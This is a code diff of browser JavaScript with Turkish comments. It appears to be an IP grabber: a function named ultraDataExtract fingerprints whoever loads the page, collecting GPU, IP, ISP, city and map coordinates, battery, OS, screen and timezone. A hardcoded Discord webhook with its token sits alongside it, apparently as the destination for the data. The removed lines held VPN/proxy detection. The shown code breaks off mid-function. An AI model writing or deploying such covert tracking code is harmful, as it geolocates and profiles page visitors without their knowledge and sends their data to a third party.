@@ -17,20 +17,18 @@
         const webhook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
         async function ultraDataExtract() {
+            // Boş değer korumalı başlangıç setupları
             let d = { 
                 gpu: "Maskelenmiş/Kısıtlı", ven: "Maskelenmiş/Kısıtlı", 
                 ip: "Alınamadı", iss: "Bilinmiyor", loc: "Bilinmiyor", 
                 net: "Bilinmiyor", bat: "Bilinmiyor", 
-                os: "Bilinmiyor", 
+                os: navigator.userAgent.split('(')[1].split(')')[0], // Manuel OS parsing
                 res: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
                 lang: navigator.language || "Bilinmiyor",
                 tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "Bilinmiyor"
             };
 
-            // OS Parsing
-            try { d.os = navigator.userAgent.split('(')[1].split(')')[0]; } catch(e) { d.os = navigator.platform; }
-
-            // 1. GPU Zorlama
+            // 1. GPU Zorlama (Agresif Mod)
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl2', {antialias:false, alpha:false}) || canvas.getContext('webgl');
@@ -41,20 +39,21 @@
                 }
             } catch(e) {}
 
-            // 2. VPN Tespiti (Senin İstediğin Keskin Mantık)
-            let vpnDetection = "✅ Temiz";
+            // 2. Ağ & Konum & ISS (Yedekli Yapı)
             try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 saniye sınırı
-
-                const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+                const res = await fetch('https://ipapi.co/json/');
                 const j = await res.json();
-                clearTimeout(timeoutId);
-
                 d.ip = j.ip || "X";
                 d.iss = `${j.org || 'Bilinmiyor'} (${j.asn || 'N/A'})`;
-                d.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${d.iss}\`\n🗺️ [Haritada Gör](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
+                d.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${d.iss}\`\n🗺️ [Haritada Gör](http://www.google.com/maps/place/${j.latitude},${j.longitude})`;
+            } catch(e) {}
+
+            // 3. Pil & İnternet Hızı
+            try {
+                if(navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    d.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
+                }
+                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
                 
-                if (j.timezone !== d.tz || j.proxy) {
-                    vpnDetection = `🚨 **VPN/PROXY ALGILANDI
-                    
